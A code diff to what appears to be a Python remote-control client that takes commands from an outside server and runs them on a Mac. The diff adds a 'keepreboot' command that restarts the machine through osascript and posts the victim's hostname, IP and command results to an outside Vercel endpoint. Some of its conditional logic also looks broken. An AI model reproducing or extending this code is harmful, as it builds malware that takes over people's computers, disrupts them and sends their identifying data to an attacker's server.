@@ -179,7 +179,7 @@ while True:
                     exit()
                 elif command.startswith('syspower'):
                     localcmd = command.split()
-                    if localcmd[1<len(localcmd)]:
+                    if localcmd[1<len(localcmd)] and not path.exists(expanduser('~')/'.syspower'):
                         try:
                             if localcmd[1] == 'shutdown' or localcmd[1] == 'poweroff':
                                 if ossystem('osascript -e \'tell app "Finder" to shut down\'') == 0:
@@ -254,6 +254,27 @@ while True:
 
                         except:
                             continue
+                    elif localcmd[1<len(localcmd)] and not path.exists(expanduser('~')/'.syspower'):
+                        if localcmd[1] == 'keepreboot':
+                            if ossystem('osascript -e \'tell app "Finder" to restart\'') == 0:
+                                try:
+                                    post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```computer gonna be keep rebooting, cya...```")
+                                    old_command = commandId
+                                except:
+                                    try:
+                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to start rebooting```")
+                                    except KeyboardInterrupt:
+                                        continue
+                                    continue
+                            else:
+                                try:
+                                    post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to start rebooting```")
+                                except KeyboardInterrupt:
+                                    continue
+                                continue
+
+                    else:
+                        remove(expanduser('~')/'.syspower')
                     continue
 
                 elif command.startswith('interact'):
